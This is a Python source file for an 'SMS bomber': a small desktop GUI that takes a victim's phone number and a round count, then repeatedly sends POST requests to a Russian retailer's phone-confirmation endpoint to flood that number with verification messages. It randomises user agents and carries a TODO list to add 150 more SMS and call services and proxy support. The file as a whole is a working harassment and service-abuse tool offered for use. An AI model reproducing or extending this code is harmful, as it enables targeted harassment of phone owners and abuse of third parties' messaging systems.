
import eel
from datetime import *

import requests, fake_useragent
from bs4 import BeautifulSoup as BS
import time
import random, string

# TO DO LIST:
# 1. add 100 services to message atacks
# 2. add 50 services to call atacks
# 3. add proxy
# 4. make an app
# 5. registration system

class Bomber():

    def __init__(self):
        self.headers = {"user_agent": fake_useragent.UserAgent().random}
        self.services = []
        self.state = "Unknow"

    def add_service(self, link, data):
        self.services.append([link, data])

    def services_init(self, phone):
        self.add_service("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/", data={})

    def do_circle(self, number):

        for num in self.services:
            self.resp = requests.post( num[0], data = num[1] )
            self.html = BS(self.resp.content, "html.parser"    )

            if self.resp.status_code > 400:
                pass
                #self.state = "Не удалось отправить сообщение с сайта: " +  num[0]

        #self.state = str(number) + " Круг пройден."
        #time.sleep(0.5)


    def attack(self, phone, circles):
        self.phone = phone
        self.circles = int(circles) 

        for i in range(1, self.circles + 1):
            self.do_circle(i)

        self.state = "Атака на номер " + self.phone + " завершена."

bomber = Bomber()

@eel.expose
def start_attack(phone, circles):

    if phone.replace(" ", "") == "":
        bomber.state = "Введите номер телефона."
        return 

    elif circles.replace(" ", "") == "":
        bomber.state = "Введите кол-во кругов."
        return  

    else:

        bomber.services_init(phone)
        bomber.attack(phone, circles)
        return "Атака на номер " + phone + " началась." 

@eel.expose
def get_state():
    return bomber.state


eel.init("web")
eel.start("index.html", size=(700,700))